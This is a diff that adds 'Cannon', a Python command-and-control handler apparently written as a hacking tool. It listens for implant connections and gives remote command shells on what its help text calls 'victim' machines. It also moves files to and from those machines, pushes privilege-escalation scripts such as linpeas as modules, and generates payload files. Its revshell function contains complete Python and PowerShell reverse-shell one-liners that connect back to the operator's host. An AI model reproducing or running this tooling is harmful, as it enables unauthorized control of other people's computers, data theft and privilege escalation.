@@ -1,0 +1,1017 @@
+#!/usr/bin/python3
+
+# Author : Kavishka Gihan
+# Instagram : @_kavi.gihan
+# Email : iamkavigihan@gmail.com
+
+from colored import fg
+import socket
+import os,requests
+import threading,platform
+import subprocess
+import sys
+import signal,time
+from pynput import keyboard
+import readline
+
+
+readline.parse_and_bind('tab: complete')
+readline.parse_and_bind('set editing-mode emacs')
+
+host_list = []
+addr_list = []
+sock_list = []
+port_list = []
+event_list = []
+running_module_list = {}
+
+IP_IDENTIFIRE = '$$IP$$'
+PORT_IDENTIFIRE = "$$PORT$$"
+
+### [Configuration area] ############################################################################################
+
+DEFAULT_PORT = 4444             # You can change it to whatever you want
+SHELL_FILE = 'cannon.shell'     # This is the name of your payload file
+CLIENT_SCRIPT_PATH = 'client'   # Change this to the path where you have the client script saved.
+EXIT_KEY = 'j'                  # This key is used to exit immediately(Ctrl + EXIF_KEY)
+DETECT_KEYEVENTS = True         # You can disable or enable key detection 
+MODULE_METHOD_IDENTIFIER = 'MDL'
+
+# Change these paths as you wish
+
+LINPEAS_PATH = '/opt/prev-esc/linux/linpeas.sh'
+LINENUM_PATH = '/opt/prev-esc/linux/LinEnum.sh'
+LINUX_PRIVCHECKER_PATH = '/opt/prev-esc/linux/linuxprivchecker.py'
+
+
+# You can define your own modules in here
+
+MODULE_LIST = {
+    'linenum': LINENUM_PATH,
+    'linpeas' : LINPEAS_PATH,
+    'linuxprivchecker': LINUX_PRIVCHECKER_PATH,    
+    'foo': '/tmp/foo_bar.py'   
+}
+
+# Make sure to add a method how you want to run the module
+
+MODULE_METHOD = {
+    'linenum': f'bash {MODULE_METHOD_IDENTIFIER} > linenum',
+    'linpeas' : f'bash {MODULE_METHOD_IDENTIFIER} > linpeas',
+    'linuxprivchecker': f'python3 {MODULE_METHOD_IDENTIFIER} > linprivchecker',
+    'foo' : f'python3 {MODULE_METHOD_IDENTIFIER} > foo_bar.log'
+}
+
+######################################################################################################################
+
+
+red = fg("red")
+green = fg("green")
+white = fg("white")
+blue = fg("blue")
+grey = fg("yellow")
+
+def banners():
+
+    print(green +"                                                    ")
+    print("        |\\                                                ")
+    print("        | \        /|                                      ")
+    print("        |  \____  / |     [+]   Cannon                     ")
+    print("       /|__/AMMA\/  |     [+]   by Kavishka Gihan          ")
+    print("      /AMMMMMMMMMMM\_|    [+]   instagram - @_kavi.gihan   ")
+    print("  ___/AMMMMMMMMMMMMMMA                                     ")
+    print("  \   |MVKMMM/ .\MMMMM\\                                   ")
+    print("   \__/MMMMMM\  /MMMMMM---                                 ")
+    print("   |MMMMMMMMMMMMMMMMMM|  /                                 ")
+    print("   |MMMM/. \MM.--MMMMMM\/                                  ")
+    print("   /\MMM\  /MM\  |MMMMMM   ___                             ")
+    print("  /  |MMMMMMMMM\ |MMMMMM--/   \-.                          ")
+    print(" /___/MMMMMMMMMM\|M.--M/___/_|   \\                        ")
+    print("      \VMM/\MMMMMMM\  |      /\ \/                         ")
+    print("       \V/  \MMMMMMM\ |      /_  /                         ")
+    print("       |  /MMMV'            / _ /                          ")
+    print("       | /                 /   /                           ")
+    print("       |/                 /   /                            ")
+    print("                         /_  /                             ")
+    print("                                                           ")
+
+
+banners()
+
+
+prompt = " "
+
+try:
+    from pynput import keyboard
+
+except Exception as e:
+    DETECT_KEYEVENTS = False
+
+
+try:
+    hoster = sys.argv[1]
+    port = sys.argv[2]
+    
+except Exception as e:
+    print(red + "[!] ERROR : Invalid syntax (cannon [IP] [port])")
+    print(green + f"[-] Using the loopback address (127.0.0.1) and default port ({DEFAULT_PORT})")
+    hoster = '127.0.0.1'
+    port = DEFAULT_PORT
+    
+
+s = socket.socket()
+s.settimeout(4)
+
+
+try:
+    print(str(banner))
+except:
+    pass
+    
+
+def listen(socket,event):
+    while True:
+        if not event.is_set():
+            socket.listen(10)
+            c, addr = socket.accept()
+
+
+            if c.recv(1024).decode() not in 'ASDF':
+                c.close()
+            else:
+                host_list.append(c)
+                addr_list.append(addr)
+
+        else:
+            break
+
+
+def port_bind(sock,port,thread,event):
+    global hoster
+    sock = socket.socket()
+
+    try:
+            sock.bind((str(hoster), int(port)))
+            
+            print(green + "\n[+] Starting the handler...")
+            print("[+] Listening on ", hoster.strip(), ":" ,str(port),white , "\n\r")
+            
+            sock_list.append(socket)
+            port_list.append(port)
+
+            event = threading.Event()
+            event_list.append(event)
+
+            thread = threading.Thread(target=listen,args=(sock,event))
+            thread.start()
+
+
+    except Exception as e:
+            print(red + "[!] Unable to bind the port " + str(port),'  ', e)
+
+            print(white + '')
+
+
+
+def last():
+    try:
+        for conn in host_list:
+            conn.send(bytes("exit", "UTF-8"))
+    except:
+        pass
+
+
+
+def conn_host():
+
+    for i,conn in enumerate(host_list):
+        yup = "True"
+        try:
+            conn.send(bytes(("asdf"*10), "UTF-8"))
+            e = conn.recv(1024).decode()
+            
+            if str(e) == ("asdf"*10):
+                yup = "True"
+            else:
+                yup = "False"
+
+            conn.send(bytes("id", "UTF-8"))
+            d = conn.recv(1024).decode()
+            
+            if yup == "False":
+                del host_list[i]
+                conn.send(bytes("exit", "UTF-8"))
+                del addr_list[i]
+            else:
+                pass
+        except:
+            try:
+                del host_list[i]
+                conn.send(bytes("exit", "UTF-8"))
+                del addr_list[i]
+
+            except Exception as e:
+                print(red + "ERROR: ",e)
+
+
+    try:
+        for m,conn in enumerate(host_list):
+            pass
+        print("[-] Hosts connected - " + str(int(m) + 1))
+    except Exception as e:
+        pass
+                
+
+
+
+def kill(evt):
+    global hoster, port
+    
+    try:
+        index = port_list.index(int(evt))
+        event = event_list[index] 
+        event.set()
+        event_list.remove(event)
+
+        print(f'\n[+] Listerner at port {evt} killed.\n')
+
+        port_list.remove(int(evt))
+        del sock_list[index]
+
+        try:
+            for i,h in enumerate(host_list):
+                if str(evt) in str(h):
+                    conn = host_list[i]
+                    del host_list[i]
+                    conn.send(b'exit')
+                    conn.close()
+
+        except Exception as e:
+            pass
+
+
+        so = socket.socket()
+        try:
+            so.connect((str(hoster), int(port)))
+            so.settimeout(3)
+            
+        except Exception as e:
+            pass
+        so.close()
+
+
+    except ValueError:
+        print(red + '\n[!] No such listener found on that port\n')
+
+
+def create_shell_script(ip,port,file):
+    global IP_IDENTIFIRE, PORT_IDENTIFIER, SHELL_FILE
+    try:
+        if os.path.isfile(file):
+            with open(file, 'r') as script:
+                content = script.readlines()
+
+            for index,line in enumerate(content):
+                if IP_IDENTIFIRE in line.strip():
+                    line = line.replace(IP_IDENTIFIRE, f"{ip}")
+                    content[index] = line
+
+                if PORT_IDENTIFIRE in line.strip():
+                    line = line.replace(PORT_IDENTIFIRE, f"{str(port)}")
+                    content[index] = line
+
+
+            with open(SHELL_FILE, 'w') as shell:
+                shell.writelines(content)
+
+            print('\n[+] Shell created succesfully')
+            print(f'[+] Saved as {SHELL_FILE}\n')
+
+        else:
+            print(red + '[!] Wrong client script path specified !')
+
+
+    except Exception as e:
+        print(red + "ERROR: ",e)
+
+
+
+def detect_keyevent(key):
+    current = set()
+
+    COMBINATIONS = [
+        {keyboard.Key.ctrl, keyboard.KeyCode(char=str(key))},
+
+    ]
+    
+    def execute():
+        print(red + "\n  [!] EXIT key detected... ")
+        last()
+        os._exit(2)
+
+    def on_press(key):
+        if any([key in COMBO for COMBO in COMBINATIONS]):
+            current.add(key)
+            if any(all(k in current for k in COMBO) for COMBO in COMBINATIONS):
+                execute()
+
+    def on_release(key):
+        try:
+            if any([key in COMBO for COMBO in COMBINATIONS]):
+                current.remove(key)
+        except:
+            pass
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+
+
+def shell():
+
+    while True:
+        pwd = os.getcwd()
+        cmd =  input(grey + "shell@" + str(pwd)+ " >" + white + ' ')
+        
+        if cmd == "clear":
+            os.system("clear")
+            
+        elif cmd == "exit":
+            break
+            
+        elif cmd[:2] == "cd" and len(cmd) > 3:
+            try:
+                os.chdir(str(cmd[3:]))
+                print(" ")
+            except FileNotFoundError:
+                print(red + 'Specified path cannot be found\n')
+        
+        elif len(cmd) == 0:
+            pass
+            
+        else:
+            try:    
+                print(white + str(os.system(str(cmd))))
+                print(" ")
+            except:
+                print(str(white) + "No result")
+
+
+
+def status():
+    try:
+        url = "https://www.kite.com"
+        timeout = 3
+
+        try:
+            request = requests.get(url, timeout=timeout)
+            print(white + "\n[-] Internet - connected")
+
+        except (requests.ConnectionError, requests.Timeout) as exception:
+            print(white + "\n[-] Internet - diconnected")
+
+
+        print("[-] Socket ip   - " + str(hoster))
+        print("[-] Socket ports - " + str(port_list[:]))
+        conn_host()
+        
+        print(' ')
+
+    except Exception as e:
+        pass
+
+
+def host():
+
+    for h,a in zip(host_list,addr_list):
+        yup = "True"
+
+        try:
+            h.send(bytes(("asdf"*10), "UTF-8"))
+            e = h.recv(1024).decode()
+                
+            if str(e) == ("asdf"*10):
+                yup = "True"
+            else:
+                yup = "False"
+
+            h.send(bytes("id", "UTF-8"))
+            d = h.recv(1024).decode()
+                
+            global prompt
+                
+            if "root" in str(d):
+                prompt = "root"
+            else:
+                prompt = "user"
+                
+                
+            if yup == "False":
+                del host_list[int(host_list.index(h))]
+                del addr_list[int(addr_list.index(a))]
+
+        except Exception as e:
+            del host_list[int(host_list.index(h))]
+            del addr_list[int(addr_list.index(a))]
+
+    print('\n[+] HOSTS')
+    if len(addr_list) == 0:
+        print('[!] No hosts are connected yet.')
+
+
+    for h,a in zip(host_list,addr_list):
+        h.send(b'get_os')
+        os = h.recv(1024).decode()
+
+
+        index = int(host_list.index(h)) + 1
+        if index == 1:
+            print(f'\n   {str(index)}',' ---> from ',a,' to ',str(h.getsockname()).strip() + " -- "+ str(os[:-3]))
+        else:
+            print(f'   {str(index)}',' ---> from ',a,' to ',str(h.getsockname()).strip() + " -- " + str(os[:-3]))
+    print("\n")
+    
+def send(c):
+
+    c.send(bytes("id", "UTF-8"))
+    e = c.recv(1024).decode()
+    
+    if "root" in str(e):
+        prompt = "root"
+    elif "user" or "shell" in str(e):
+        prompt = "user"
+    else:
+        prompt = " "
+
+
+    while True:
+        
+        cmd = input(red + str(prompt) + "@remote >"  + white + ' ')
+        if cmd == "exit":
+            break
+            inter()
+            
+        elif len(cmd) == 0:
+            print(white + "No result")
+
+        elif cmd == "cls" or cmd == "clear":
+            try:
+                os.system("clear")
+            except:
+                os.system("cls")
+        else:
+            try:
+                c.send(bytes(str(cmd), "UTF-8"))
+                while True:
+                    rec = c.recv(102400).decode()
+                    print(white + rec[:-3])
+                    if rec[-3:] == "EOF":
+                        break
+                
+            except:
+                print(white + "[-] Disconnected\n\r")
+                break
+
+
+
+def get_files(connection,src_file,dst_file):
+    try:
+        print('\n[-] Downloading the file...')
+        connection.send(bytes('get_files', 'UTF'))
+        time.sleep(1)
+        connection.send(bytes(src_file,'UTF-8'))
+        lines = b''
+
+        while lines[-3:] != b"EOF":
+            lines += connection.recv(90240000)
+
+        if str(lines.decode()) == 'Failed':
+            print(red + '[!] Unable to download the specified file')
+        else:
+            with open(dst_file,'wb') as f:
+                f.write(lines[:-3])
+            print(white + '[-] File saved as ' + dst_file + '\n')
+
+    except Exception as e:
+        pass
+
+
+def send_files(connection,src_file,dst_file):
+    try:    
+        print('[-] Uploading the file...')
+        connection.send(bytes('send_files', 'UTF-8'))
+        time.sleep(1)
+        connection.send(bytes(dst_file,'UTF-8'))
+
+        r = ""
+        if os.path.isfile(src_file):
+            OS = platform.uname().system
+
+            if OS == 'Linux':
+                r = 'cat'
+
+            elif OS == 'Windows':
+                r = 'type'
+            
+            lines = subprocess.run(f'{r} {src_file.strip()}',text=True,capture_output=True,shell=True)
+
+            connection.send(bytes(lines.stdout,'UTF-8'))
+            connection.send(bytes('EOF', 'UTF-8'))
+            result = connection.recv(100000).decode()
+        
+            if 'ERROR' in result:
+                print(red + result)
+
+            else:
+                print(result)
+
+        else:
+            print(red + '[!] ERROR: FileNotFoundError')
+
+    except Exception as e:
+        pass
+    
+def module_show(connection):
+    print('\n[=] Searching loaded modules...')
+    for module in MODULE_LIST:
+        if module_check(connection, module):
+            print(f'[+] "{module.strip()}" module found.')
+
+
+
+
+def module_search(module):
+    global MODULE_LIST
+    try:
+        if module.strip() in MODULE_LIST:
+            module_path = MODULE_LIST[module]
+            return module_path
+        else:
+            return False
+
+        
+    except Exception as e:
+        print(red + "ERROR: ",e)
+
+def module_check(connection, module):
+    try:
+        file_name = None
+        
+        for m in MODULE_LIST:
+            if m == module:
+                file_name = MODULE_LIST[m].split("/")[-1]
+                break
+
+        else:
+            return False
+
+        if file_name:
+            connection.send(b'check_file')
+            time.sleep(1)
+            connection.send(bytes(file_name, 'UTF-8'))
+            file_exists = connection.recv(1024).decode()
+            
+            if str(file_exists[:-3]).strip() == "True":  
+                return True
+            else:
+                
+                return False
+
+    except Exception as e:
+        print(red + "ERROR: ",e)
+
+
+def module_start(connection,module,host):
+    try:
+        global running_module_list, MODULE_METHOD_IDENTIFIER
+        for key in MODULE_METHOD:
+            if module.strip() == key.strip():
+                method = MODULE_METHOD[key.strip()]
+
+                method = method.replace(MODULE_METHOD_IDENTIFIER, MODULE_LIST[module.strip()].split('/')[-1])
+                method = method.strip()
+                connection.send(b'module_run')
+                time.sleep(1)
+                connection.send(bytes(method,'UTF-8'))
+
+                break
+
+        else:
+            print(red + f'[!] A method is not specified for the module "{module}"')
+
+
+
+    except Exception as e:
+        return False
+        print(red + "ERROR: ",e)
+
+def module_run(connection,module,host):
+    
+    try:
+        print('\n[=] Checking the loaded modules...')
+        if module_check(connection, module):
+            print(f"[+] Module '{module}' found")
+
+            if host not in running_module_list:
+                running_module_list[host] = []
+
+            if module.strip() not in running_module_list[host]:
+                running_module_list[host].append(module.strip())
+                print('[+] Checking for any errors...')
+                threading.Thread(target=module_start,args=(connection, module,host)).start()
+                time.sleep(1)
+                print('[+] Module started successfully')
+                running_module_list[host].remove(module.strip())
+
+            else:
+                print(red + f'[!] This module is already running !')
+
+
+        else:
+            print(red + f'[!] Module "{module}" is not loaded yet ! ')
+
+        print('')
+    except Exception as e:
+        print(red + "ERROR: ",e)
+
+
+def module_help():
+    print('\n   [-] list   - List the available modules  ')
+    print('   [-] load   - Load a module  (module load linpeas)')
+    print('   [-] search - Search for a module (module search linpeas)')
+    print('   [-] check  - Check for loaded modules (module check linpeas)')
+    print('   [-] run    - Run a loaded module (module run linpeas)')
+    print('   [-] show   - Show all loaded modules')
+    print('\n If you want to add additional modules, you can add an entry \non the MODULE_LIST, with a module name you like and the path to the file\n')
+
+def module_menu(connection,command,module,host):
+    global send_files
+
+    try:
+        if command.strip() == 'list':
+            print('')
+
+            for num,m in enumerate(MODULE_LIST):
+                print(f'[{num + 1}] {m} : {MODULE_LIST[m]}')
+
+            print('')
+        
+        elif command.strip() == 'help':
+            module_help()
+
+        elif command.strip() == 'load':
+            path = module_search(module.strip())
+
+            if path:
+                print(f'\n[=] Loading the module {module}...')
+                dst_file = path.split('/')[-1]
+                send_files(connection, path, dst_file)
+
+            else:
+                print(red + f'\n[!] Module {module} not found\n')
+
+
+        elif command.strip() == 'search':
+            path = module_search(module)
+            if path:
+                print('\n[+] Module found')
+                print(f'[+] {module}: {path.strip()}\n')
+
+
+            else:
+                print(red + f'[!] Module "{module}" not found !\n')
+
+
+        elif command.strip() == 'check':
+            print('\n[=] Checking for loaded modules...')
+            if module_check(connection, module):
+                print(f'[+] Module "{module}" is loaded\n')
+
+            else:
+                print(red + f'[!] Module "{module}" is not  loaded\n')
+
+        elif command.strip() == 'run':
+            module_run(connection, module,host)
+
+        elif command.strip() == 'show':
+            module_show(connection)
+            print('')
+
+        else:
+            print(red + "[!] Invalid command : use 'module help' to get the help menu\n")
+
+    except Exception as e:
+        print(red + "ERROR: ",e)
+
+
+ 
+def meter_help():
+    print('\n    [-] upload     - upload files to the victim machine')
+    print('                   - upload [src_file] [dst_file]')
+    print('    [-] downlaod   - downlaod files from the victim machine')
+    print('                   - download [what to downlaod] [where to be stored]')
+    print('    [-] revshell   - create a revershell')
+    print('                   - revshell [port] (Make sure you have a listener on the port)')
+    print('    [-] module     - load,run  modules')
+    print('                   - use `module help` get get more information')
+    print('    [-] channel    - use the meterpreter shell [cmd access]')
+    print('    [-] shell      - use the local shell [of your system]')
+    print('    [-] info       - Show basic information ')
+    print('                   - [ -s = system info ,-m = memnory info ,-a = all info]')
+    print('    [-] list       - list the current hosts connected')
+    print('    [-] status     - show current status')
+    print('    [-] help       - show the help menu')
+    print('    [-] back       - exit the meterpreter\n')
+
+
+def keyboardInterruptHandler(signal, frame):
+    global EXIT_KEY
+    print(red + f"\n  [!] Use 'exit' or EXIT_KEY ('{EXIT_KEY}') to quit Cannon...")
+
+signal.signal(signal.SIGINT, keyboardInterruptHandler)
+
+
+def infos(connection,flag):
+
+
+    if flag.strip() == '-s':
+        connection.send(b'sys_info')
+        print(connection.recv(1024).decode())
+
+    elif flag.strip() == '-m':
+        connection.send(b'sys_info_memo')
+        print(connection.recv(1024).decode())
+
+    elif flag.strip() == '-ip':
+        connection.send(b'ip_info')
+        print(connection.recv(1024).decode())
+
+    elif flag.strip() == '-a':
+        connection.send(b'sys_info_all')
+        print(connection.recv(1024).decode())
+        print(connection.recv(1024).decode())
+
+
+    else:
+        print(red + '[!] Invalid flag : ' + str(flag))
+        print('[!] Usage : info [-a,-m,-s]\n')
+
+
+
+def revshell(connection,port):
+
+    try:
+        connection.send(bytes(("create_shell"),'UTF-8'))
+
+        print(white + f"\n[+] Sending the payload")
+        print(f'[+] Make sure you have a listener [nc -lvnp {str(port).strip()}]')
+        payload = f"""export RHOST="{hoster}";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")' """
+        payload += """  &&  powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"""" + str(hoster).strip() + """\",""" + str(port) + """ );$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() """
+        time.sleep(1)
+        connection.send(bytes(payload, 'UTF-8'))
+        print(f"[+] Executing the reverse shell towards {hoster}:{port}\n")
+        
+        
+
+    except Exception as e:
+        pass
+
+
+def meterpreter(hosts,conn):
+    global con
+    while True:
+        prompt = green + f'meterpreter[{hosts}]>' + white + ' '
+        meter = input(prompt)
+        meter = meter.strip()
+        if meter == 'channel':
+            send(conn)
+
+        elif meter[:7] == "connect":
+                num = meter[8:9]
+                if len(num) == 0:
+                    print(red + '[!] Specify the host number, use `list` to see the conencted hosts\n')
+                else:
+                    try:
+                        for i,con in enumerate(host_list):
+                            if i == (int(num) - 1):
+                                meterpreter(num,con)
+                        else:
+                            print(red + "[!] No such host found\n\r")
+
+                    except Exception as e:
+                        pass
+                        
+
+        elif meter[:6] == 'module':
+            try:
+                meter = meter.split(' ')
+                if 'list' == meter[1].strip():
+                    module_menu(conn, meter[1], None, hosts)
+
+                elif 'help' == meter[1].strip():
+                    module_menu(conn, meter[1], None, hosts)
+
+                elif 'show' == meter[1].strip():
+                    module_menu(conn, meter[1], None, hosts)
+
+                else:
+                    if len(meter) != 3:
+                        print(red + "[!] Invalid syntax : use 'module help' to get the help menu\n")
+                    else:
+                        module_menu(conn, meter[1], meter[2],hosts)
+
+            except IndexError:
+                print(red + "[!] Invalid syntax : use 'module help' to get the help menu\n")
+
+
+        elif meter[:8] == 'download':
+            meter = meter.split(' ')
+            if len(meter) != 3:
+                print(red + "[!] Specify a src_file and dst_file\n")
+            else:
+                get_files(conn,meter[1],meter[2])
+
+        elif meter[:6] == 'upload':
+            meter = meter.split(' ')
+            if len(meter) != 3:
+                print(red + "[!] Specify a src_file and dst_file\n")
+            else:
+                print('')
+                send_files(conn,meter[1],meter[2])
+
+        elif meter[:8] == 'revshell':
+            meter = meter.split(" ")
+            try:
+                if len(meter) != 2:
+                    print(red + "[!] Specify a port to connect\n")
+
+                else:
+                    port = meter[1]
+                    revshell(conn,port)
+            except Exception as e:
+                pass                
+
+        elif meter[:4] == 'info':
+            flag = meter[5:].strip() 
+            infos(conn,flag)
+
+        elif meter == 'clear':
+            os.system('clear')
+
+
+        elif meter == 'status':
+            status()
+
+        elif meter == 'shell':
+            shell()
+
+        elif meter == 'list':
+            host()
+
+        elif meter == 'help':
+            meter_help()
+
+        elif meter == 'back':
+            inter()
+        else:
+            print(white + 'No result')
+
+
+
+def inter():
+    try:
+        while True:
+            read = input(green + "Cannon >" + white +' ')
+
+            if read[:4] == "list" and len(read) <= 4:
+                host()
+    
+            elif read[:6] == 'create':
+                try:
+                    read = read.split(' ')
+                    ip = hoster
+                    port = read[1]
+                    create_shell_script(ip, port, CLIENT_SCRIPT_PATH)
+
+                except Exception as e:
+                    print(red + '[!] Invalid syntax: (create [IP] [PORT])\n')
+
+
+            elif read[:7] == "connect":
+                try:
+                    num = int(read[8:])
+                    for i,con in enumerate(host_list):
+                        if i == (int(num) - 1):
+                            meterpreter(num,con)
+                    else:
+                        print(red + "[!] No such host found \n\r")
+
+                except Exception as e:
+                    print(red + '[!] ERROR: Invalid syntax\n')
+            
+            elif read[:10] == "disconnect":
+                num = read[11:]
+                if (num == "*"):
+                    last()
+                    del host_list[:]    
+                    del addr_list[:]
+                    print(white + "[-] All hosts disconnected\n\r")     
+            
+                else:
+                    try:
+                        new_num = int(num) - 1
+                        for i,conn in enumerate(host_list):
+                            if i == int(new_num):
+                                del host_list[i]
+                                conn.send(bytes("exit", "UTF-8"))
+                                
+                            else:
+                                pass 
+                        dont = "true"
+                        
+                        for i,conn in enumerate(addr_list):
+                            if i == int(new_num):
+                                del addr_list[i] 
+                                print(white + "\n[-] Host " + str(num) + " disconnected\n\r")
+                                dont = "false"
+                            else:
+                                pass
+                                
+                        else:
+                            if dont == "true":
+                                print(red + "[!] No such host found\n\r")
+                            else:
+                                pass
+                            
+                    except Exception as e:
+                        print(red + "ERROR: ",e)
+            
+
+            elif read[:4] == 'bind':
+                try:
+                    p = read[5:]
+                    port_bind(str(p),int(p),str(p),str(p))
+
+                except ValueError:
+                    print(red + '\n[!] Invalid usage: bind [port number]\n')
+
+            elif read[:4] == "kill":
+                kill(read[5:])
+
+
+            elif read == "clear":
+                os.system("clear")
+
+            elif read == "shell":
+                shell()
+                
+            elif read == "banner":
+                banners()
+            
+            elif read == "status":
+                status()
+                
+            elif read == "help":
+                help()
+                
+            elif read == "exit":
+                print(white + '')
+                last()
+                os._exit(2)
+                
+            elif len(read) == 0:
+                pass
+            else:
+                print(white + "No result") 
+    except KeyboardInterrupt:
+        print(red + '[!] Keyboard Interuption: exiting...')
+
+    
+def help():
+    print(white + "\n    [-] list         - list the currently connected hosts")
+    print("    [-] create       - create the payload file [create <PORT>]")
+    print("    [-] connect      - connect to the meterpreter of the specified host [connect <no.>]")
+    print("    [-] disconnect   - disconnect a connected host [disconnect <no.>]")
+    print("    [-] bind         - start a listener [bind <port>]")
+    print("    [-] kill         - stop a listener [kill <port>]")
+    print("    [-] status       - show current status")
+    print("    [-] shell        - enter the system shell through Cannon")
+    print("    [-] exit         - exit")
+    print(" ") 
+  
+try:    
+    port_bind(str(port), int(port),str(port),str(port))
+
+except Exception as e:
+    print(red + "[!] ERROR : Invalid syntax (cannon [IP] [port])\n")
+
+def main():
+    global  EXIT_KEY
+    if DETECT_KEYEVENTS:
+        threading.Thread(target=detect_keyevent,args=(EXIT_KEY,)).start()
+
+    else:
+        print(red + '[!] Ignoring key detection, EXIT_KEY is now disabled.\n')
+
+    threading.Thread(target=inter).start()
+
+main()
